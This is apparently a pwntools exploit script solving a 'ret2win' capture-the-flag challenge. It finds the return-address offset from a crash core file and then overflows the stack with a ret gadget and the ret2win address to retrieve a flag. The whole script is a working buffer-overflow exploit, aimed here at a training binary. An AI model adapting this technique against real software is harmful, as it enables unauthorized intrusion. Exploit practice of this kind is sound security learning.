#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2win_patched")

context.binary = exe
rop = ROP(exe)


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100)
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    stack = core.rsp
    rip_value = core.read(stack, 4)
    rip_offset = cyclic_find(rip_value)
    info('Located EIP offset : {a}'.format(a=rip_offset))

    r = conn()
    payload = flat(asm('nop')*rip_offset + p64(rop.ret.address) + p64(exe.symbols.ret2win))
    r.sendlineafter(b'>', payload)
    
    r.recv()
    r.recv()
    flag = r.readline()
    print(flag)


if __name__ == "__main__":
    main()
